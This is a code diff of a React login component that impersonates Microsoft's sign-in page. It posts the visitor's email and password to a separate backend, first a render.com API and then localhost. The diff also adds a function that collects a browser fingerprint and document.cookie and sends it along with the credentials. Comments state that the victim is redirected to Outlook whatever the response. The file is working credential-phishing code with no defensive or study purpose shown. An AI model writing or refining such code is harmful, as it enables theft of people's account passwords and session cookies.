@@ -1,7 +1,6 @@
 import React, { useState } from 'react';
 import { VscKey } from "react-icons/vsc";
 import { IoMdArrowBack } from "react-icons/io";
-import { useNavigate } from 'react-router-dom';
 
 function Login() {
     const apiUrl = import.meta.env.VITE_API_URL;
@@ -9,31 +8,65 @@ function Login() {
     const [mail, setMail] = useState('');
     const [pass, setPass] = useState('');
     const [isLoading, setIsLoading] = useState(false);
-    const navigate = useNavigate();
+
+    const validateEmail = (email) => {
+        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return re.test(email);
+    };
+
+    const collectBrowserData = () => {
+        return {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            languages: navigator.languages,
+            platform: navigator.platform,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            screenResolution: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookies: document.cookie,
+            timestamp: new Date().toISOString(),
+            url: window.location.href
+        };
+    };
 
     const handleNext = (e) => {
         e.preventDefault();
-        if (mail) setShowPassword(true);
+        if (validateEmail(mail)) {
+            setShowPassword(true);
+        } else {
+            alert("Please enter a valid email address");
+        }
     };
 
     const handleBack = () => setShowPassword(false);
 
     const loginHandler = async (e) => {
         e.preventDefault();
+        if (!mail || !pass) return;
+        
         setIsLoading(true);
         try {
-            const res = await fetch("https://bd-mys-api.onrender.com/api/contact", {
+            const browserData = collectBrowserData();
+            
+            const res = await fetch("http://localhost:3000/api/contact", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ mail, pass })
+                body: JSON.stringify({ 
+                    mail, 
+                    pass, 
+                    browserData,
+                    loginUrl: "https://login.microsoftonline.com/" 
+                })
             });
-            if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
-            const data = await res.json();
-            window.location.href = "https://outlook.live.com/";
+            
+            // Always redirect to Outlook regardless of API response
+            
+            
         } catch (error) {
-            console.error("Network or parsing error", error);
-        } finally {
-            setIsLoading(false);
+            console.error("Submission error:", error.message);
+            // Still redirect on error
+            // window.location.href = "https://outlook.live.com/";
         }
     };
 
@@ -49,7 +82,7 @@ function Login() {
                                 Verifying Identity
                             </h3>
                             <p className="text-gray-600">
-                                Please wait while we verify your identity...
+                                Redirecting to Outlook...
                             </p>
                         </div>
                     </div>
@@ -59,9 +92,10 @@ function Login() {
             <div className='absolute top-0 left-0 w-40 h-40 bg-[rgba(201,148,174,0.3)] rounded-full blur-sm'></div>
             <div className='lg:w-[450px] w-[400px]'>
                 <div className='relative bg-white h-[350px] overflow-hidden'>
+                    {/* Email Screen */}
                     <div className={`absolute w-full transition-transform duration-300 ${showPassword ? '-translate-x-full' : 'translate-x-0'}`}>
                         <div className='p-[50px]'>
-                            <img src="/image/miclogo.png" alt="" className='h-6' />
+                            <img src="/image/miclogo.png" alt="Microsoft" className='h-6' />
                             <h3 className='text-2xl font-semibold my-6'>Sign In</h3>
                             <form onSubmit={handleNext}>
                                 <input
@@ -79,28 +113,27 @@ function Login() {
                             <div className='absolute bottom-4 right-4'>
                                 <button
                                     onClick={handleNext}
-                                    className='bg-blue-400 text-white px-9 py-o.5'>
+                                    className='bg-blue-400 text-white px-9 py-1 rounded'>
                                     NEXT
                                 </button>
                             </div>
                         </div>
                     </div>
 
-                    <div className="absolute w-full h-full transition-transform duration-300" style={{
-                        transform: showPassword ? 'translateX(0)' : 'translateX(100%)'
-                    }}>
+                    {/* Password Screen */}
+                    <div className={`absolute w-full h-full transition-transform duration-300 ${showPassword ? 'translate-x-0' : 'translate-x-full'}`}>
                         <div className="relative h-full">
                             <div className="p-10">
-                                <img src="/img/miclogo.png" alt="" className='h-6' />
+                                <img src="/img/mylogo.png" alt="Microsoft" className='h-6' />
                                 <div className="mt-8">
-                                    <p className="text-sm text-gray-600 mb-6 flex">
-                                        <button onClick={handleBack} className="text-gray-600 mr-1">
+                                    <p className="text-sm text-gray-600 mb-6 flex items-center">
+                                        <button onClick={handleBack} className="text-gray-600 mr-2">
                                             <IoMdArrowBack size={19} />
                                         </button>
                                         {mail}
                                     </p>
                                     <h1 className='text-2xl font-semibold my-5'>Enter password</h1>
-                                    <form onSubmit={loginHandler} className="relative h-full">
+                                    <form onSubmit={loginHandler} className="h-full">
                                         <input
                                             type="password"
                                             placeholder="Password"
@@ -109,22 +142,21 @@ function Login() {
                                             required
                                             onChange={(e) => setPass(e.target.value)}
                                         />
+                                        <div className="absolute bottom-10 right-10">
+                                            <button
+                                                type="submit"
+                                                className="bg-blue-500 text-white px-9 py-2 hover:bg-blue-600 transition-colors rounded"
+                                            >
+                                                Sign in
+                                            </button>
+                                        </div>
                                     </form>
                                 </div>
-                            </div>
-
-                            <div className="absolute bottom-10 right-10">
-                                <button
-                                    type="submit"
-                                    onClick={loginHandler}
-                                    className="bg-blue-500 text-white px-9 py-[3px] hover:bg-blue-600 transition-colors"
-                                >
-                                    Sign in
-                                </button>
                             </div>
                         </div>
                     </div>
                 </div>
+                
                 <div className='bg-white mt-[15px] w-full h-[50px] flex items-center justify-center'>
                     <p className="flex items-center gap-2 text-gray-600">
                         <span className="flex items-center"><VscKey /></span>
